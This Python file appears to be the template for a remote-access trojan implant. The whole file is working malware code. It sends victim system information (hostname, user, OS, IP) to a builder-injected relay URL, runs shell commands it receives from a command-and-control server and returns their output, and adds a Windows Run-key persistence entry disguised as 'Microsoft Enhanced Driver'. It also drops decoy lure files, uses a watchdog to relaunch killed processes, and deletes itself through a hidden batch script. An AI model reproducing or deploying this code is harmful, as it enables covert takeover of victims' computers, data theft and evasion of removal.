# payload/template.py (Definitive, with Immediate System Info Harvest)

import sys, os, time, threading, platform, base64, subprocess, uuid, requests, json, socket, getpass, shutil, re, random

try: from mss import mss
except ImportError: mss = None
# NOTE: win32crypt is deprecated and will not work for decrypting modern browser data.
# Any future credential harvesting functions will need to use an updated method involving
# DPAPI and AES-256-GCM decryption directly.
try: import win32crypt
except ImportError: win32crypt = None
try: import winreg
except ImportError: winreg = None
try: import psutil
except ImportError: psutil = None
try: import ctypes
except ImportError: ctypes = None
try: import sqlite3
except ImportError: sqlite3 = None

# --- INJECTED BY BUILDER ---
RELAY_URL = {{RELAY_URL}}
C2_USER = {{C2_USER}}
SESSION_ID = str(uuid.uuid4())
STEALTH_MODE = {{STEALTH_MODE}}
PERSISTENCE_ENABLED = {{PERSISTENCE_ENABLED}}
POPUP_ENABLED = {{POPUP_ENABLED}}
POPUP_TITLE = {{POPUP_TITLE}}
POPUP_MESSAGE = {{POPUP_MESSAGE}}
DECOY_ENABLED = {{DECOY_ENABLED}}
DECOY_FILENAME = {{DECOY_FILENAME}}
DECOY_DATA_B64 = {{DECOY_DATA_B64}}
HYDRA_ENABLED = {{HYDRA_ENABLED}}
HYDRA_GUARDIANS = {{HYDRA_GUARDIANS}}

results_to_send, results_lock = [], threading.Lock()

def harvest_system_info():
    try:
        uname = platform.uname(); ip = "N/A"
        # FIX: Changed verify=False to verify=True to enforce secure SSL/TLS connections.
        try: ip = requests.get('https://api.ipify.org', timeout=10, verify=True).text
        except: pass
        data = { "hostname": socket.gethostname(), "user": getpass.getuser(), "os": f"{uname.system} {uname.release}", "ip": ip, "arch": uname.machine }
        return {"status": "success", "data": data}
    except Exception: return {"status": "error", "data": {"hostname": socket.gethostname(), "user": getpass.getuser()}}

def _action_popup(params):
    if ctypes:
        ctypes.windll.user32.MessageBoxW(0, params.get('message', 'Hello from C2!'), params.get('title', 'Message'), 0)
    return {"status": "success", "data": "Popup displayed on target."}

def _action_self_destruct(params):
    if PERSISTENCE_ENABLED and platform.system() == "Windows" and winreg:
        try:
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            key_name = "Microsoft Enhanced Driver"
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
                winreg.DeleteValue(reg_key, key_name)
        except Exception: pass
    try:
        cleanup_script_path = os.path.join(os.environ["TEMP"], f"cleanup_{uuid.uuid4().hex}.bat")
        with open(cleanup_script_path, "w") as f:
            f.write("@echo off\n")
            f.write("timeout /t 3 /nobreak > NUL\n")
            f.write(f"del \"{sys.executable}\"\n")
            f.write(f"del \"%~f0\"\n")
        subprocess.Popen([cleanup_script_path], creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS, close_fds=True)
    except Exception: pass
    sys.exit(0)

def _action_shell(params):
    command = params.get("command", "")
    if not command:
        return {"status": "error", "data": "No command provided."}
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30, creationflags=subprocess.CREATE_NO_WINDOW)
        output = result.stdout + result.stderr
        if not output:
            output = "[No output produced by command]"
        return {"status": "success", "data": output}
    except subprocess.TimeoutExpired:
        return {"status": "error", "data": "[Command timed out after 30 seconds]"}
    except Exception as e:
        return {"status": "error", "data": f"[Error executing command: {e}]"}

def execute_command(command_data):
    action = command_data.get('action')
    params = command_data.get('params', {})
    response_id = command_data.get('response_id')

    handler_func = getattr(sys.modules[__name__], f"_action_{action}", None)

    result = {"status": "error", "data": f"Unsupported action: {action}"}
    if callable(handler_func):
        try: result = handler_func(params)
        except Exception as e: result = {"status": "error", "data": f"Handler for '{action}' failed: {e}"}

    if response_id:
        try:
            payload = {"session_id": SESSION_ID, "c2_user": C2_USER, "response_id": response_id, "result": result}
            # FIX: Changed verify=False to verify=True.
            requests.post(f"{RELAY_URL}/implant/response", json=payload, timeout=20, verify=True)
        except requests.exceptions.RequestException:
            pass # Silently fail if response cannot be sent, as C2 will poll again.

def command_and_control_loop(initial_metadata):
    while True:
        try:
            with results_lock:
                outgoing_results = results_to_send[:]; results_to_send.clear()
            heartbeat_data = {"session_id": SESSION_ID, "c2_user": C2_USER, "results": outgoing_results, "hostname": initial_metadata.get("hostname"), "user": initial_metadata.get("user"), "os": initial_metadata.get("os")}
            # FIX: Changed verify=False to verify=True.
            response = requests.post(f"{RELAY_URL}/implant/hello", json=heartbeat_data, timeout=40, verify=True)
            if response.status_code == 200:
                for cmd in response.json().get("commands", []):
                    threading.Thread(target=execute_command, args=(cmd,), daemon=True).start()
        # FIX: Catch specific network-related exceptions, not all errors.
        # This prevents the implant from dying due to unexpected logic errors.
        except requests.exceptions.RequestException:
            pass
        time.sleep(random.randint(8, 15))

def hydra_watchdog():
    guardian_names = json.loads(HYDRA_GUARDIANS)
    my_name = os.path.basename(sys.executable)
    while True:
        try:
            running_procs = {p.info['name'] for p in psutil.process_iter(['name'])}
            missing_guardians = set(guardian_names) - running_procs
            for guardian in missing_guardians:
                if guardian != my_name:
                    guardian_path = os.path.join(os.path.dirname(sys.executable), guardian)
                    if os.path.exists(guardian_path):
                        subprocess.Popen([guardian_path], creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS, close_fds=True)
        except Exception: pass
        time.sleep(10)

def initial_lure():
    if POPUP_ENABLED: _action_popup({"title": POPUP_TITLE, "message": POPUP_MESSAGE})
    if DECOY_ENABLED:
        try:
            decoy_path = os.path.join(os.environ["TEMP"], DECOY_FILENAME)
            with open(decoy_path, "wb") as f: f.write(base64.b64decode(DECOY_DATA_B64))
            os.startfile(decoy_path)
        except: pass

def install_persistence():
    if PERSISTENCE_ENABLED and platform.system() == "Windows" and winreg:
        try:
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            key_name = "Microsoft Enhanced Driver"
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
                winreg.SetValueEx(reg_key, key_name, 0, winreg.REG_SZ, sys.executable)
        except: pass

if __name__ == "__main__":
    flag_file = os.path.join(os.environ["TEMP"], f"tether_flag_first_run_{SESSION_ID[:8]}.flg")
    if not os.path.exists(flag_file):
        initial_lure()
        install_persistence()
        try:
            with open(flag_file, 'w') as f: f.write('done')
        except: pass

    # FIX: Run initial harvest once and reuse the data to avoid redundant calls.
    initial_info = harvest_system_info()
    initial_metadata = initial_info.get("data", {})

    # Send initial info immediately if not in stealth mode
    if not STEALTH_MODE:
        if initial_info.get("status") == "success":
            with results_lock:
                results_to_send.append({"command": "System Info", "output": initial_info})

    # Start the main C2 loop, passing in the already-harvested metadata
    c2_thread = threading.Thread(target=command_and_control_loop, args=(initial_metadata,), daemon=True)
    c2_thread.start()

    if HYDRA_ENABLED:
        watchdog_thread = threading.Thread(target=hydra_watchdog, daemon=True)
        watchdog_thread.start()

    # Keep the main thread alive
    while True:
        time.sleep(3600)